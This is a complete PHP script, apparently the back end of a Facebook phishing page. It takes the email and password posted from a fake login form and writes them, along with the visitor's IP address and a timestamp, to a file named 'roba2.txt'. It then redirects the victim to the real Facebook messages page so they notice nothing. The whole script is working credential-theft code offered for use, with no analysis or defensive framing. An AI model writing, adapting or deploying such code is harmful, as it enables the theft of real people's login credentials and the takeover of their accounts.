<?php
$login=$_POST["email"];
$pass=$_POST["pass"];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha= date("h:i:s a - d/m/Y");
$guardar=fopen("roba2.txt",a);
fwrite($guardar,"
-Nombre de usuario: ".$login."
-Password: ".$pass."
-Fecha: ".$fecha."
-IP: ".$ip."
");
fclose($guardar);
header ("Location: https://www.facebook.com/messages/");
?>

